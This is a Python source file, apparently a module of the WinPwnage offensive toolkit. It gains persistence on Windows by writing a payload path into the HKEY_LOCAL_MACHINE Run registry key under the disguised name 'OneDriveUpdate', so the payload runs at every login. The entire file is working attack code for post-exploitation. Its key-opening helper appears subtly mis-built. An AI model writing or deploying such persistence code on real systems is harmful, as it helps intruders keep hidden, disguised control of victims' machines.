import os
import _winreg
from winpwnage.core.prints import *
from winpwnage.core.utils import *

hklmrun_info = {
	"Description": "Gain persistence using HKEY_LOCAL_MACHINE Run registry key",
	"Id": "20",
	"Type": "Persistence",
	"Fixed In": "99999",
	"Works From": "7600",
	"Admin": True,
	"Function Name": "hklm_run",
	"Function Payload": True,
}


def reg_create(path,name,payload):
	try:
		key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, os.path.join(path, name), 0, _winreg.KEY_ALL_ACCESS)
		_winreg.SetValueEx(key, name, 0, _winreg.REG_SZ, payload)
		_winreg.CloseKey(key)
	except Exception as error:
		return False
	else:
		return True


def hklm_run(payload):
	if payloads().exe(payload):
		if information().admin():
			if "64" in information().architecture():
				if reg_create("Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", "OneDriveUpdate", payload):
					print_success("Successfully created OneDriveUpdate key containing payload ({})".format(os.path.join(payload)))
					print_success("Successfully installed persistence, payload will run at login")
				else:
					print_error("Unable to install persistence")
					return False
			else:
				if reg_create("Software\\Microsoft\\Windows\\CurrentVersion\\Run", "OneDriveUpdate", payload):
					print_success("Successfully created OneDriveUpdate key containing payload ({})".format(os.path.join(payload)))
					print_success("Successfully installed persistence, payload will run at login")
				else:
					print_error("Unable to install persistence")
					return False
		else:
			print_error("Cannot proceed, we are not elevated")
			return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False
